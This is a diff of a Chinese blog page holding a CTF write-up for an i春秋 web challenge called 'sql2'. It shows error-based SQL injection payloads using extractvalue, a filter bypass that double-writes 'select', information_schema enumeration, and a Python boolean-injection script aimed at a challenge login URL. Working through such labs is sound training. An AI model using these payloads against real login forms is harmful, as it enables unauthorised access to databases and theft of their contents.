@@ -126,7 +126,7 @@
 <meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg">
 <meta property="og:image" content="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg">
 <meta property="article:published_time" content="2021-01-29T11:16:33.000Z">
-<meta property="article:modified_time" content="2021-01-29T11:49:14.702Z">
+<meta property="article:modified_time" content="2021-01-30T08:47:08.027Z">
 <meta property="article:author" content="π1L4r">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -404,12 +404,24 @@
                 
               
 
-              <time title="创建时间：2021-01-29 19:16:33 / 修改时间：19:49:14" itemprop="dateCreated datePublished" datetime="2021-01-29T19:16:33+08:00">2021-01-29</time>
+              <time title="创建时间：2021-01-29 19:16:33" itemprop="dateCreated datePublished" datetime="2021-01-29T19:16:33+08:00">2021-01-29</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-01-30 16:47:08" itemprop="dateModified" datetime="2021-01-30T16:47:08+08:00">2021-01-30</time>
               
             
           </span>
@@ -453,7 +465,7 @@
         <h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>我没找到他的题目idXD</p>
 <a id="more"></a>
 <p><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/1.jpg" alt></p>
-<h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>打开题目提示去login.php看。<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/2.jpg" alt><br>查看源代码，提示url加?tips=1开启报错，用burpsuit可以查看，立刻想到使用报错注入<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/3.jpg" alt><br>同时先简单尝试一下，发现账号存在字符注入，用单引号闭合（1’ or 1=1和1’ and 1=2）<br>使用burp，如下<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/4.jpg" alt><br>当然，借助右边回应是账号不存在还是账号错误可以进行布尔注入，但是既然有了提示，为什么不用呢？<br>使用extractvalue报错注入，得到database为note<br>1’ or 1=1 and (extractvalue(‘anything’,concat(‘~‘,(select database()))))#<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/5.jpg" alt><br>然后理所应当接下来操作是information_schema三连，但是他老说我语法有错，我看了半天直接心态小崩，搁网上找了找别人的wp，然后发现他过滤了select……于是双写select来information_schema三连。<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;))))#&amp;pass=456</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/6.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(selselectect flag from note.fl4g))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg" alt></p>
+<h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>打开题目提示去login.php看。<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/2.jpg" alt><br>查看源代码，提示url加?tips=1开启报错，用burpsuit可以查看，立刻想到使用报错注入<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/3.jpg" alt><br>同时先简单尝试一下，发现账号存在字符注入，用单引号闭合（1’ or 1=1和1’ and 1=2）<br>使用burp，如下<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/4.jpg" alt><br>当然，借助右边回应是账号不存在还是账号错误可以进行布尔注入，但是既然有了提示，为什么不用呢？<br>使用extractvalue报错注入，得到database为note<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;\~&#39;,(select database()))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/5.jpg" alt><br>然后理所应当接下来操作是information_schema三连，但是他老说我语法有错，我看了半天直接心态小崩，搁网上找了找别人的wp，然后发现他过滤了select……于是双写select来information_schema三连。<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;))))#&amp;pass=456</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/6.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(selselectect flag from note.fl4g))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg" alt></p>
 <p>然后我还顺着我看的wp的做法整了一遍布尔注入。<br>爆数据库长度</p>
 <figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">string</span><br> <br> <br>dic = <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span><br>right = <span class="hljs-string">'8bef'</span><br>url = <span class="hljs-string">'http://eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com/login.php'</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):<br>    key = <span class="hljs-string">"admin' and "</span> + <span class="hljs-string">"(length(database())="</span> + str(i) + <span class="hljs-string">")#"</span><br>    <span class="hljs-built_in">data</span> = &#123;<span class="hljs-string">'name'</span>:key, <span class="hljs-string">'pass'</span>:<span class="hljs-string">'123'</span>&#125;<br>    r = requests.post(url, <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>).text<br>    #print(r)<br>    <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> str(r):<br>        print(<span class="hljs-string">'the length of database is %s'</span> %i)<br></code></pre></td></tr></table></figure>
 
@@ -533,6 +545,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2021/01/30/i%E6%98%A5%E7%A7%8B-random/" rel="prev" title="i春秋-random">
+                i春秋-random <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -605,7 +621,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">38</span>
+                    <span class="site-state-item-count">39</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
